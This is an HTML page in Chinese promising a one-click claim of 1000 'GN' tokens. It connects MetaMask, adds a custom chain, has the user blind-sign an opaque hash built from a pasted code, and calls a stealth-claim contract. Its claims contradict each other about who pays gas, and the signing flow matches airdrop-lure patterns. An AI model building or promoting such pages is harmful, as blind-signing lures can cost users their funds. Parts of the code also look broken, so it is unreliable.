<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>GN 一键领取 1000</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:system-ui;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:20px}
.c{max-width:400px;width:100%;background:#111;border:3px solid #00ff88;border-radius:30px;padding:35px;box-shadow:0 0 60px #00ff8840}
.logo{width:90px;height:90px;border-radius:50%;margin:0 auto 20px;display:block}
h1{font-size:28px;text-align:center;background:linear-gradient(90deg,#00ff88,#88ff00);-webkit-background-clip:text;color:transparent;margin-bottom:20px}
textarea{width:100%;padding:16px;margin:12px 0;border-radius:16px;background:#000;border:2px solid #333;color:#fff;font-size:15px;outline:none;resize:none}
button{width:100%;padding:18px;margin:12px 0;border-radius:16px;background:#00ff88;color:#000;font-weight:900;font-size:18px;border:none;cursor:pointer}
#log{color:#0f0;text-align:center;margin-top:15px;font-size:16px;line-height:1.6}
</style>
</head>
<body>
<div class="c">
  <img src="https://raw.githubusercontent.com/WoofingLabs/Grabbit/main/images/GN.png" class="logo">
  <h1>GN 隐私领取</h1>
  <textarea id="paste" rows="4" placeholder="请粘贴你的暗号"></textarea>
  <button id="claim">一键领取 1000 GN（我付 Gas）</button>
  <div id="log">请粘贴暗号 → 点按钮 → 30秒到账</div>
</div>

<script type="module">
import Web3 from 'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm';

const RPC = 'https://gatelayer-mainnet.gatenode.cc';
const CONTRACT = '0x13336e9d92eE3F7aBA8A5150A5DeB2FcD77EEB82';
const ABI = [
  {"inputs":[{"internalType":"bytes32","name":"_stealthAddress","type":"bytes32"},{"internalType":"bytes","name":"_ephemeralPubKey","type":"bytes"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"stealthTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"address","name":"_sender","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"},{"internalType":"bytes32","name":"_stealthAddress","type":"bytes32"},{"internalType":"bytes","name":"_ephemeralPubKey","type":"bytes"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"},{"internalType":"uint8","name":"v","type":"uint8"}],"name":"claimStealth","outputs":[],"stateMutability":"nonpayable","type":"function"}
];

let web3, account, contract;
const log = document.getElementById('log');

// 一键连接 + 解锁弹窗
async function connect() {
  if (!window.ethereum) return alert('请安装 MetaMask');
  try { await ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:'0x2768'}]}); }
  catch { await ethereum.request({method:'wallet_addEthereumChain', params:[{
    chainId:'0x2768', chainName:'GateLayer', rpcUrls:[RPC], nativeCurrency:{name:'GT',symbol:'GT',decimals:18}
  }]});
  }
  await ethereum.request({method:'eth_requestAccounts'});
  account = (await ethereum.request({method:'eth_accounts'}))[0];
  web3 = new Web3(RPC);
  contract = new web3.eth.Contract(ABI, CONTRACT);
  log.innerHTML = `已连接 ${account.slice(0,10)}...<br>可直接领取`;
}
connect();

// 一键领取（自动签名 + 付 Gas）
document.getElementById('claim').onclick = async () => {
  const input = document.getElementById('paste').value.trim();
  if (!input) return log.innerText = '请先粘贴暗号';
  
  let d;
  try { d = JSON.parse(atob(input)); }
  catch { return log.innerText = '暗号错误'; }

  log.innerHTML = '请稍等...<br>MetaMask 将弹出 2 次：<br>1. 签名<br>2. 支付 Gas';

  try {
    const msg = web3.utils.soliditySha3(
      {t:'address', v:d.s},
      {t:'uint256', v:web3.utils.toWei(d.a,'ether')},
      {t:'bytes32', v:d.t},
      {t:'bytes', v:d.p}
    );
    const hash = web3.utils.soliditySha3(
      {t:'string', v:'\x19Ethereum Signed Message:\n32'},
      {t:'bytes32', v:msg}
    );

    const sig = await ethereum.request({method:'personal_sign', params:[hash, account]});
    const r = sig.slice(0,66);
    const s = '0x' + sig.slice(66,130);
    let v = parseInt(sig.slice(130,132),16);
    if (v < 27) v += 27;

    await contract.methods.claimStealth(
      d.s,
      web3.utils.toWei(d.a,'ether'),
      d.t,
      d.p,
      r, s, v
    ).send({from: account});

    log.innerHTML = `领取成功！<br>+${d.a} GN 已到账！`;
    document.getElementById('paste').value = '';
  } catch (e) {
    log.innerText = e.message.includes('User denied') ? '你取消了交易' : '错误：' + e.message;
  }
};
</script>
</body>
</html>
